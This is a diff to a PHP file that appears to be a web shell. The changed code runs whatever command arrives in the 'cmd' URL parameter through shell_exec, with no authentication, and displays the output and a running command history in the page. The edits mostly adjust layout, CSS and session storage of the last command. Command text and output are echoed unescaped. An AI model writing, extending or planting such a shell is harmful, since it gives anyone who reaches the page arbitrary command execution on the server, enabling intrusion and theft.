@@ -1980,11 +1980,17 @@ RK5CYII=',
 
 <?php
 
-echo "<div class='shell' style='width: 90%; float:right; padding: 10px; margin: auto'>";
+echo "<div class='shell' style='width: 95%; float:right; padding: 10px; margin: auto'>";
 
 
 if( empty($_SESSION['history']) ) {
             $_SESSION['history'] = "";
+}
+if( empty($_SESSION['last-cmd-output']) ) {
+            $_SESSION['last-cmd-output'] = "";
+}
+if( empty($_SESSION['last-cmd']) ) {
+            $_SESSION['last-cmd'] = "";
 }
 
 
@@ -2009,33 +2015,31 @@ echo "</br>";
 if(isset($_GET["cmd"])){
     if($_GET['cmd'] != ""){
         $command = $_GET['cmd'];
+        $_SESSION['last-cmd'] = $command;
+        $cmd_output = shell_exec($command);
+        $_SESSION['last-cmd-output'] = $cmd_output;
         echo '<div class="cmd-output floater">';
-        echo "<div class='section'>Command Output</div>";
-        echo "</br>";
-        echo "</br>";
-        echo "<span class='cmd'>".$command."</span>";
-        echo "</br>";
-        echo "</br>";
+        echo "<p class='section-header'>Command Output</p>";
+        echo "<div class='cmd'>".$command."</div>";
         echo "<div class='print-output'>";
-        $output = '<div class="history-log"> <pre>' . shell_exec($command) . '</pre></div>';
+        $output = '<div class="history-log"> <pre>' . $cmd_output . '</pre></div>';
         echo $output;
-        echo "</div></br>";
+        echo "</div>";
         $hist = $_SESSION['history'];
-        $new_hist = "<span class='cmd'>" . $command . "</span>" . "</br></br>" . $output . "</br>" . $hist . "</br></br>";
+        $new_hist = "<div class='cmd'>" . $command . "</div>" . $output . "</br>" . $hist . "</br></br>";
         $_SESSION['history'] = $new_hist;
         echo '</div>';
     }
 } else {
         echo '<div class="cmd-output floater">';
-        echo "<div class='section'>Command Output</div>";
-        echo "</br>";
-        echo "</br>";
-        echo "<span class='cmd'></span>";
-        echo "</br>";
-        echo "</br>";
+        echo "<p class='section-header'>Command Output</p>";
+        echo "<div class='cmd'>". $_SESSION['last-cmd'] ."</div>";
         echo "<div class='print-output'>";
-        echo "</div></br>";
+        $output = '<div class="history-log"> <pre>' . $_SESSION['last-cmd-output'] . '</pre></div>';
+        echo $output;
         echo "</div>";
+        echo '</div>';
+
 }
 
 if(isset($_GET["reset"])){
@@ -2044,10 +2048,8 @@ if(isset($_GET["reset"])){
     }
 }
 echo "<div class='history floater'>";
-echo "<div class='section'>History</div>";
+echo "<p class='section-header'>History</p>";
 echo "<div class='print-output'>";
-echo "</br>";
-echo "</br>";
 echo $_SESSION['history'];
 echo "</div>"; //history-form
 echo "</div>"; //history
@@ -2079,11 +2081,18 @@ echo '</script>';
 .cmd-form{
     width: 80%;
 }
-.section{
+.section-header{
     font-weight: bold;
+    padding-right: 10px;
 }
 .file-browser{
     overflow-y: scroll;
     max-height: 20vw;
+}
+div.cmd{
+    padding-bottom: 10px;
+    padding-top: 4px;
+    color: #0600ff;
+    font-weight: bolder;
 }
 </style>
